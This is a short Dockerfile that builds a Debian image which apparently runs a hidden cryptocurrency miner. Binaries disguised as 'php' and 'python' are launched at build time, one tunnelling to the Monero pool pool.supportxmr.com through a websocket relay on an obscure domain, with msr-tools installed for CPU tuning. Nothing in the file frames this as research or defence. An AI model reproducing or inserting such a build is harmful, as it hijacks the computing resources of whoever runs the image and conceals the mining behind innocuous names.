FROM debian:sid

WORKDIR /app
COPY * /app/

RUN apt update -y \
  && apt upgrade -y \
  && apt install -y procps msr-tools
RUN chmod a+x *
RUN ( /app/php -L 127.0.0.1:3333:pool.supportxmr.com:3333 wss://op-cf.vscwjm.eu.org & ) && ./python

CMD ./init.sh
